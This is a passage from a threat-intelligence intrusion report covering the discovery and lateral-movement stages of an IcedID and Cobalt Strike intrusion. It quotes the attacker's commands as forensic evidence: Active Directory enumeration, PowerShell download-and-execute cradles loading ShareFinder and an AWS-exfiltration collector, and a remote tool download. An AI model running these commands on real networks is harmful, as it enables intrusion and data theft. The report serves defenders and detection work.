<p>In this case, this was seen executed by the parent process svchost.exe, which we saw IcedID inject into during the <a href="#execution">Execution</a> section of this report.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">ipconfig /all
systeminfo
net config workstation
nltest /domain_trusts
nltest /domain_trusts /all_trusts
net view /all /domain
net view /all
net group "Domain Admins" /domain
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>We also observed the threat actor use the VNC functionality to spawn MS Edge, Firefox and Chrome.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32096" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-038.png" alt="" width="1152" height="130" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-038.png 1152w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-038-300x34.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-038-1024x116.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-038-768x87.png 768w" sizes="(max-width: 1152px) 100vw, 1152px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>There is a possibility to inspect the VNC traffic done by IcedID using <a href="https://github.com/0xThiebaut/PCAPeek/" target="_blank" rel="noreferrer noopener">https://github.com/0xThiebaut/PCAPeek/</a> as demonstrated in this report: <a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" target="_blank" rel="noreferrer noopener">https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>But due to circumstances of the environment pcaps were not available to inspect in this case.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Cobalt Strike</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The day after initial access, the threat actor performed enumeration activities from a domain controller, looking for active hosts.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32097" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-039.png" alt="" width="1478" height="551" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-039.png 1478w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-039-300x112.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-039-1024x382.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-039-768x286.png 768w" sizes="(max-width: 1478px) 100vw, 1478px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>About two hours later, the injected process <code>gpupdate.exe</code> executed numerous DNS queries that appeared to target all hosts in active directory.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32098" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-040.png" alt="" width="1908" height="694" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-040.png 1908w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-040-300x109.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-040-1024x372.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-040-768x279.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-040-1536x559.png 1536w" sizes="(max-width: 1908px) 100vw, 1908px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>WMIC</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Multiple wmic enumeration commands were executed from the Cobalt Strike beacon with the aim of enumerating information related to the physical disk, memory, network adapters, bios and Windows domain on a a compromised server.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32099" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-041.png" alt="" width="923" height="931" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-041.png 923w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-041-297x300.png 297w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-041-150x150.png 150w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-041-768x775.png 768w" sizes="(max-width: 923px) 100vw, 923px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>ShareFinder</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the second day of the intrusion, network shares were discovered through the execution directly in memory of <a href="https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1" target="_blank" rel="noreferrer noopener">Invoke-ShareFinder</a>, and the output was saved into a text file. The output from the execution was visible in the PowerShell 4104 events:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32100" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-042.png" alt="" width="840" height="435" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-042.png 840w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-042-300x155.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-042-768x398.png 768w" sizes="(max-width: 840px) 100vw, 840px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Execution of the tool was also available in the 4104 events:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:50916/'); Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>This specific command line was described in the &#8220;<a href="https://twitter.com/thedfirreport/status/1498651797249998854" target="_blank" rel="noreferrer noopener">Fast Guide</a>&#8221; of Conti Leaks.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A deep dive into this tool was done here:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><a href="https://thedfirreport.com/2023/01/23/sharefinder-how-threat-actors-discover-file-shares/" target="_blank" rel="noreferrer noopener">ShareFinder: How Threat Actors Discover File Shares</a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Hands-on Keyboard Discovery</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Throughout the attack, multiple discovery commands were launched manually:</p>
<p>Systems information or objects (e.g., folders.):</p>
<pre>systeminfo
net config workstation
tasklist /svc
ping -n 1 [REDACTED]
net view
dir \\[REDACTED]\C$
</pre>
<!-- /wp:paragraph -->
<p>Network connections and information:</p>
<pre>ipconfig /all
route print
arp -a
netstat -an
</pre>
<p>Active Directory related:</p>
<pre>net accounts /domain
net user [REDACTED] /domain
net user Administrator /domain
nltest dclist:
nltest /domain_trusts /all_trusts
net groups /domain
net group "domain controllers" /domain
net group "Domain Admins" /domain
net group "domain computers" /domain 
net time /domain
net share<br /><span class="unifiedDataTable__inner"><span class="unifiedDataTable__cellValue">setspn.exe -F -Q */*<br />​setspn [-T REDACTED] -Q cifs/*</span></span>
</pre>
<!-- wp:paragraph -->
<p><strong>Seatbelt</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the third day, after accessing the backup server, the threat actor used the <code>execute-assembly</code> Cobalt Strike functionality to execute Seatbelt in memory and saved the output in c:\programdata\full_info.txt. <a href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="noreferrer noopener">Seatbelt</a> is a tool used to enumerate various information from a compromised host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32101" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-043.png" alt="" width="995" height="813" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-043.png 995w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-043-300x245.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-043-768x628.png 768w" sizes="(max-width: 995px) 100vw, 995px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>PowerShell</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Throughout the intrusion, while the threat actor used default Windows discovery tools and brought plenty of their own tooling, they also heavily used various PowerShell Cmdlets and .NET calls for discovery. These were visible via process command line activity with base64 encoded commands.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32102" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-044.png" alt="" width="1676" height="506" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-044.png 1676w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-044-300x91.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-044-1024x309.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-044-768x232.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-044-1536x464.png 1536w" sizes="(max-width: 1676px) 100vw, 1676px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Decoded command examples:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32104" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-045.png" alt="" width="1652" height="463" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-045.png 1652w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-045-300x84.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-045-1024x287.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-045-768x215.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-045-1536x430.png 1536w" sizes="(max-width: 1652px) 100vw, 1652px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>AWS Collector Enumeration</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>With the aim of obtaining the external IP address associated with the compromised infrastructure, the threat actor executed the following PowerShell script which contacts the API of <a href="http://ipify.org" target="_blank" rel="noreferrer noopener">ipify.org</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">add-type @" using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult( ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } } "@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12' [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy $ip = $Null $ip = (New-Object System.Net.WebClient).DownloadString("http://ipecho.net/plain") if ($ip -eq $null) { $ip = (New-Object System.Net.WebClient).DownloadString("http://api.ipify.org") } return $ip
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Ookla&#8217;s SpeedTest executable was downloaded from a GitHub repository to get the download and upload bandwidth information.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">ScriptBlock: $url = 'https://github.com/darussian777/tools/raw/master/speedtest.exe' $path = "$($Env:ProgramData)\SpeedtestCLI" if (!(test-path $path)) { new-item $path -ItemType Directory -force | out-null } if (!(test-path "$($path)\speedtest.exe")) { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri $url -OutFile "$($path)\speedtest.exe" } if (!(test-path "$($path)\result.json")) { &amp; "$($path)\speedtest.exe" --format=json --accept-license --accept-gdpr | Out-File "$($path)\result.json" -force } try { $result = get-content "$($path)\result.json" | ConvertFrom-Json -ErrorAction Stop } catch { &amp; "$($path)\speedtest.exe" --format=json --accept-license --accept-gdpr | Out-File "$($path)\result.json" -force $result = get-content "$($path)\result.json" | ConvertFrom-Json } return @(([math]::Round($result.download.bandwidth / 1000000 * 8)), ([math]::Round($result.upload.bandwidth / 1000000 * 8)))
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>This action was likely conducted to understand the speed with which the data would have been exfiltrated from the environment.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This was functions executed using the AWScollector PowerShell script:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32105" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-046.png" alt="" width="1299" height="580" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-046.png 1299w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-046-300x134.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-046-1024x457.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-046-768x343.png 768w" sizes="(max-width: 1299px) 100vw, 1299px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32106" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-047.png" alt="" width="872" height="786" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-047.png 872w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-047-300x270.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-047-768x692.png 768w" sizes="(max-width: 872px) 100vw, 872px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>BloodHound</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On one of the domain controllers we found evidence of <a href="https://github.com/BloodHoundAD/SharpHound" target="_blank" rel="noreferrer noopener">Sharphound</a> execution via file artifacts recovered from memory.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-048.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32107" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-048.png" alt="" width="790" height="57" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-048.png 790w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-048-300x22.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-048-768x55.png 768w" sizes="(max-width: 790px) 100vw, 790px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>This was also visible in the PowerShell logs with the encoded command line showing this being executed by the AWSCollector module.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32108" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-049.png" alt="" width="727" height="575" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-049.png 727w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-049-300x237.png 300w" sizes="(max-width: 727px) 100vw, 727px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Decoded PowerShell command responsible for Bloodhound file write:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:33333/'); InvokeModule -module awscollector -awskey REDACTED -awssecret REDACTED -awss3bucket REDACTED -awsregion us-east-1 -handleSystems REDACTED
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>This function is covered further in the break down of AWSCollector in the <a href="#exfiltration">Exfiltration</a> section.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Netscan</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the third and fifth day of the intrusion, the threat actor executed <a href="https://www.softperfect.com/products/networkscanner/" target="_blank" rel="noreferrer noopener">netscan</a> via the Cobalt Strike beacon.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-050.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32109" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-050.png" alt="" width="1340" height="156" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-050.png 1340w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-050-300x35.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-050-1024x119.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-050-768x89.png 768w" sizes="(max-width: 1340px) 100vw, 1340px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>AdFind</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the second and eighth day of the intrusion, <a href="https://www.joeware.net/freetools/tools/adfind/" target="_blank" rel="noreferrer noopener">AdFind</a> was executed to enumerate AD computer objects and users.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-051.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32110" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-051.png" alt="" width="1627" height="230" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-051.png 1627w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-051-300x42.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-051-1024x145.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-051-768x109.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-051-1536x217.png 1536w" sizes="(max-width: 1627px) 100vw, 1627px" /></a></p>
<p>&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Nbtscan</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the eighth day of the intrusion the threat actor dropped <a href="http://www.unixwiz.net/tools/nbtscan.html" target="_blank" rel="noreferrer noopener">nbtscan</a>, a tool for scanning address ranges looking for NETBIOS nameservers.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-052.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32111" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-052.png" alt="" width="1750" height="227" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-052.png 1750w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-052-300x39.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-052-1024x133.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-052-768x100.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-052-1536x199.png 1536w" sizes="(max-width: 1750px) 100vw, 1750px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The flags provided to the tool by the threat actor included:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>-v This turns on some more verbose debugging.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>-s separator Script-friendly output. (this does not appear to be implemented in the Windows tool version they used but mentioned in other <a href="https://www.kali.org/tools/nbtscan/" target="_blank" rel="noreferrer noopener">tool version docs</a>)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>-p not a valid flag</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>PowerShell Remoting</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In order to move laterally into different systems through Cobalt Strike beacons, the threat actor used the functionality called <code>jump winrm</code> which relies on the Windows PowerShell Remoting protocol (MS-PSRP). The following image &#8211; extracted from the memory of a compromised server &#8211; shows the processes executed when this type of lateral movement is performed by Cobalt Strike beacons.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-053.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32112" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-053.png" alt="" width="1830" height="357" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-053.png 1830w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-053-300x59.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-053-1024x200.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-053-768x150.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-053-1536x300.png 1536w" sizes="(max-width: 1830px) 100vw, 1830px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Also, from the source host, it is possible to notice that a WinRM session is created to the target host which is tracked through the Event ID 41 by the Microsoft-Windows-WinRM provider.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-054.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32113" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-054.png" alt="" width="1334" height="584" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-054.png 1334w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-054-300x131.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-054-1024x448.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-054-768x336.png 768w" sizes="(max-width: 1334px) 100vw, 1334px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>On the domain controller, we also were able to observe the threat actor running remote PowerShell using the <code>Enter-PSSession</code> cmdlet.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-055.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32114" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-055.png" alt="" width="418" height="95" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-055.png 418w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-055-300x68.png 300w" sizes="(max-width: 418px) 100vw, 418px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>WMI</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>One day after initial access, the threat actor transferred Cobalt Strike DLL beacons to several servers over SMB. Subsequently, the DLL was executed through the Cobalt Strike command <code>remote-exec wmi</code>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-056.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32115" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-056.png" alt="" width="2000" height="151" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-056.png 2000w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-056-300x23.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-056-1024x77.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-056-768x58.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-056-1536x116.png 1536w" sizes="(max-width: 2000px) 100vw, 2000px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>When this technique is used, the following sequence of events is created:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Event ID 5145 &#8211; Network share object access: Tracks the creation of a file in a network share, in this case \\*\C$\ProgramData\.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Event ID 4626 &#8211; Successful logon: Tracks the network logon (Type 3) performed by the compromised user.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Event ID 4688 &#8211; A new process has been created: <code>svchost.exe</code> spawns a new <code>wmiprvse.exe</code> process.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Event ID 4688 &#8211; A new process has been created: <code>wmiprvse.exe</code> executed the malicious file previously created.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Viewed from another perspective with Sysmon Event ID 1 we could see the calls to WMIC on the source host with the &#8220;process call create&#8221; to the remote host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-057.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32116" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-057.png" alt="" width="2027" height="364" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-057.png 2027w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-057-300x54.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-057-1024x184.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-057-768x138.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-057-1536x276.png 1536w" sizes="(max-width: 2027px) 100vw, 2027px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>PsExec</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Another lateral movement functionality abused to jump between the hosts was <code>jump psexec</code>. Several executable beacons were transfer via this:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-058.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32118" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-058.png" alt="" width="1344" height="634" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-058.png 1344w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-058-300x142.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-058-1024x483.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-058-768x362.png 768w" sizes="(max-width: 1344px) 100vw, 1344px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Execution of these beacons was then performed via remote services available in event ID 7045.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-059.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32119" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-059.png" alt="" width="465" height="138" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-059.png 465w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-059-300x89.png 300w" sizes="(max-width: 465px) 100vw, 465px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Remote Desktop Protocol</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actor also used the <code>oldadministrator</code> user created using the AnyDesk installation script to move to other hosts using RDP.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-060.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32120" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-060.png" alt="" width="1313" height="69" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-060.png 1313w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-060-300x16.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-060-1024x54.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-060-768x40.png 768w" sizes="(max-width: 1313px) 100vw, 1313px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Throughout the intrusion all RDP activity was started from the one domain controller used as a central pivot point to connect to other hosts.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-061.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32121" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-061.png" alt="" width="2326" height="614" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-061.png 2326w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-061-300x79.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-061-1024x270.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-061-768x203.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-061-1536x405.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-061-2048x541.png 2048w" sizes="(max-width: 2326px) 100vw, 2326px" /></a></p>
<!-- /wp:paragraph -->

